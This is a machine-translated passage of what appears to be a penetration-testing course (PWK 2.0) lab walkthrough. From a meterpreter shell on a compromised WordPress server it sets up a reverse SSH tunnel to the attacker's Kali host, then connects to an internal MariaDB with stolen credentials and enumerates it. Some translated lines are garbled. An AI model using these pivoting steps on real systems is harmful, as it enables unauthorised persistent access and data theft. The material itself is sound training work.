<div style="position:absolute;top:192276;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫 id_rsa.pub</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:192293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMf</font></font></nobr></div>
<div style="position:absolute;top:192311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8Z</font></font></nobr></div>
<div style="position:absolute;top:192328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Io/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T</font></font></nobr></div>
<div style="position:absolute;top:192344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF</font></font></nobr></div>
<div style="position:absolute;top:192361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla</font></font></nobr></div>
<div style="position:absolute;top:192381;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 896 - 生成 SSH 密钥</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个新的公钥需要在我们的 Kali 主机的authorized_keys 文件中为kali 用户输入，但是</font></font></nobr></div>
<div style="position:absolute;top:192429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一些限制。</font><font style="vertical-align: inherit;">为了避免潜在的安全问题，我们只能收紧 ssh 配置</font></font></nobr></div>
<div style="position:absolute;top:192449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许来自 WordPress IP 地址的访问（请注意，这将是 NAT IP，因为</font></font></nobr></div>
<div style="position:absolute;top:192468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是 Kali 将看到的，而不是实际 WordPress 主机的 IP）。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:192631;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="163"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 163 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:192664;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:193741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:193741;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:193741;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">780</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:192760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们要忽略用户提供的任何命令。</font><font style="vertical-align: inherit;">这可以通过</font><i><font style="vertical-align: inherit;">命令</font></i><font style="vertical-align: inherit;">完成</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:192779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh 中的选项。</font><font style="vertical-align: inherit;">我们还希望通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">no-agent-forwarding</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:192798;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无 X11 转发</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项。</font><font style="vertical-align: inherit;">最后，我们要防止用户被分配一个 tty 设备</font></font></nobr></div>
<div style="position:absolute;top:192818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">no-tty</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项。</font><font style="vertical-align: inherit;">Kali 上的最终 ~/.ssh/authorized_keys 文件可以在清单 897 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:192852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">from="10.11.1.250",command="echo '此账号只能用于端口转发'",</font></font></nobr></div>
<div style="position:absolute;top:192870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无代理转发，无 X11 转发，无 pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA</font></font></nobr></div>
<div style="position:absolute;top:192887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ</font></font></nobr></div>
<div style="position:absolute;top:192904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7k</font></font></nobr></div>
<div style="position:absolute;top:192920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Z1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9x</font></font></nobr></div>
<div style="position:absolute;top:192937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">k87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MD</font></font></nobr></div>
<div style="position:absolute;top:192954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nin www-data@ajla</font></font></nobr></div>
<div style="position:absolute;top:192974;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 897 - Kali 上的 ~/.ssh/authorized_keys 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此条目允许私钥的所有者（Web 服务器）登录到我们的 Kali 机器，但</font></font></nobr></div>
<div style="position:absolute;top:193023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阻止他们运行命令，只允许端口转发。</font></font></nobr></div>
<div style="position:absolute;top:193055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们需要向我们的 ssh 命令添加更多选项以确保它可以工作。</font><font style="vertical-align: inherit;">第一的</font></font></nobr></div>
<div style="position:absolute;top:193075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要添加</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-N</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志来指定我们没有运行任何命令。</font><font style="vertical-align: inherit;">我们还需要</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b></nobr></div>
<div style="position:absolute;top:193094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求 ssh 进入后台的选项。</font><font style="vertical-align: inherit;">最后，我们还需要提供我们的密钥文件</font></font></nobr></div>
<div style="position:absolute;top:193114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在使用 via </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:193146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最终的 SSH 命令可以在清单 898 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:193181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul</font></font></nobr></div>
<div style="position:absolute;top:193198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:193218;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 898 - ssh 命令的最终迭代</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们需要在meterpreter shell 中运行SSH 命令。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:193282;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul</font></font></b></nobr></div>
<div style="position:absolute;top:193299;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:193316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法创建目录“/var/www/.ssh”。</font></font></nobr></div>
<div style="position:absolute;top:193333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：将“10.11.0.4”（ECDSA）永久添加到已知主机列表中。</font></font></nobr></div>
<div style="position:absolute;top:193352;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 899 - 执行 ssh 命令的最后一次迭代</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们验证一下 Kali 机器上的端口是否打开：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:193416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo netstat -tulpn</font></font></font></b></nobr></div>
<div style="position:absolute;top:193433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动 Internet 连接（仅限服务器）</font></font></nobr></div>
<div style="position:absolute;top:193450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proto Recv-Q Send-Q 本地地址外地址状态PID/程序名称    </font></font></nobr></div>
<div style="position:absolute;top:193467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:193467;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:111 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:193467;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 1/systemd    </font></font></nobr></div>
<div style="position:absolute;top:193484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:193484;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:22 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:193484;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 645/sshd    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:193501;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></b></nobr></div>
<div style="position:absolute;top:193501;left:198"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 127.0.0.1:13306 0.0.0.0:*    </font></font></b></nobr></div>
<div style="position:absolute;top:193501;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 91364/sshd：kali</font></font></b></nobr></div>
<div style="position:absolute;top:193518;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></b></nobr></div>
<div style="position:absolute;top:193518;left:198"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 127.0.0.1:1122 0.0.0.0:*    </font></font></b></nobr></div>
<div style="position:absolute;top:193518;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 91364/sshd：kali</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:193535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 :::111    </font></font></nobr></div>
<div style="position:absolute;top:193535;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:193535;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 1/systemd    </font></font></nobr></div>
<div style="position:absolute;top:193552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 :::22    </font></font></nobr></div>
<div style="position:absolute;top:193552;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:193552;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 645/sshd    </font></font></nobr></div>
<div style="position:absolute;top:193569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 ::1:13306    </font></font></nobr></div>
<div style="position:absolute;top:193569;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:193569;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 91364/sshd：kali    </font></font></nobr></div>
<div style="position:absolute;top:193586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 ::1:1122    </font></font></nobr></div>
<div style="position:absolute;top:193586;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:193586;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 91364/sshd：kali    </font></font></nobr></div>
<div style="position:absolute;top:193603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...   </font></font></nobr></div>
<div style="position:absolute;top:193622;left:365"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 900 - 验证开放端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，由于ssh命令是在后台运行的，即使我们的meterpreter shell</font></font></nobr></div>
<div style="position:absolute;top:193671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不行了，我们可以通过远程隧道远程访问数据库服务器。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:193819;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="164"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 164 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:193852;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:194929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:194929;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:194929;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">781</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:193948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3 以数据库为目标</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:193989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序经常在另一台服务器上配置一个数据库，就像</font></font></nobr></div>
<div style="position:absolute;top:194009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒.本地。</font><font style="vertical-align: inherit;">但是，此时我们可以通过网络访问数据库主机，并且对于</font></font></nobr></div>
<div style="position:absolute;top:194028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数情况下，我们可以将其视为在同一个网络上。</font><font style="vertical-align: inherit;">与隧道的情况一样，我们</font></font></nobr></div>
<div style="position:absolute;top:194048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该期待一些滞后。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:194082;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3.1</font></font></i></nobr></div>
<div style="position:absolute;top:194082;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在数据库枚举步骤的这一点上，我们已经知道了一些事情。</font><font style="vertical-align: inherit;">因为</font></font></nobr></div>
<div style="position:absolute;top:194139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问 WordPress 服务器，我们知道主机与我们位于不同的网络中</font></font></nobr></div>
<div style="position:absolute;top:194158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目前在。</font><font style="vertical-align: inherit;">我们也知道我们正在运行 MariaDB 版本 10.3.20。</font><font style="vertical-align: inherit;">快速谷歌搜索</font></font></nobr></div>
<div style="position:absolute;top:194178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向我们展示了这是一个相当新的版本。</font><font style="vertical-align: inherit;">这提出了一个问题，因为新版本很可能不会</font></font></nobr></div>
<div style="position:absolute;top:194197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在导致远程代码执行的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:194230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们连接到数据库并开始列举 MariaDB 的其他方面。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:194264;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3.1.1 应用/服务枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要连接到 MariaDB，我们可以使用 Kali 的内置 MySQL 客户端以及我们拥有的凭据</font></font></nobr></div>
<div style="position:absolute;top:194318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 WordPress 配置文件中恢复。</font><font style="vertical-align: inherit;">虽然 MariaDB 是一个与 MySQL 不同的包，</font></font></nobr></div>
<div style="position:absolute;top:194338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它被设计为向后兼容。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">730</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还需要将 MySQL 客户端指向</font></font></nobr></div>
<div style="position:absolute;top:194357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 端口 13306 上运行的隧道。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:194392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysql --host=127.0.0.1 --port=13306 --user=wp -p</font></font></font></b></nobr></div>
<div style="position:absolute;top:194409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入密码： </font></font></nobr></div>
<div style="position:absolute;top:194443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入“帮助；” </font><font style="vertical-align: inherit;">或 '\h' 寻求帮助。</font><font style="vertical-align: inherit;">键入 '\c' 清除当前输入语句。</font></font></nobr></div>
<div style="position:absolute;top:194477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [（无）]&gt; </font></font></nobr></div>
<div style="position:absolute;top:194496;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 901 - 连接到 MariaDB</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经连接上了，我们可以看看我们作为 wp 用户拥有哪些特权，并获得更好的</font></font></nobr></div>
<div style="position:absolute;top:194545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解如何配置此 MariaDB 实例。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:194580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(无)]&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SHOW Grants;</font></font></font></b></nobr></div>
<div style="position:absolute;top:194597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:194614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">wp@% 的补助金    </font></font></nobr></div>
<div style="position:absolute;top:194614;left:797"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:194630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:194647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">授予使用 *.* 到 'wp'@'%' 由密码识别的 '*61163AE4B131AB0E43F07BE7B' |</font></font></nobr></div>
<div style="position:absolute;top:194665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">GRANT </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SELECT, INSERT, UPDATE, DELETE</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ON `wordpress`.* TO 'wp'@'%'    </font></font></nobr></div>
<div style="position:absolute;top:194665;left:724"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:194682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:194698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 行（0.075 秒）</font></font></nobr></div>
<div style="position:absolute;top:194718;left:380"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 902 - wp 用户授权</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:194747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们没有“*”权限，但 SELECT、INSERT、UPDATE 和 DELETE 是一个好的开始</font></font></nobr></div>
<div style="position:absolute;top:194766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">观点。</font><font style="vertical-align: inherit;">接下来，让我们看看一些变量，看看我们是否能找到任何突出的东西。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:194801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [（无）]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示变量；</font></font></font></b></nobr></div>
<div style="position:absolute;top:194818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+-----------------------------------------+------ --------------------------------+</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:194879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">730 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（MariaDB，2020），https://mariadb.com/kb/en/library/mariadb-vs-mysql-compatibility/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:195007;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="165"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 165 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:195040;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:196117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:196117;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:196117;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">782</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">变量名    </font></font></nobr></div>
<div style="position:absolute;top:195136;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">价值    </font></font></nobr></div>
<div style="position:absolute;top:195136;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+-----------------------------------------+------ --------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:195169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">改变算法    </font></font></nobr></div>
<div style="position:absolute;top:195169;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">默认    </font></font></nobr></div>
<div style="position:absolute;top:195169;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">aria_block_size    </font></font></nobr></div>
<div style="position:absolute;top:195186;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">8192    </font></font></nobr></div>
<div style="position:absolute;top:195186;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
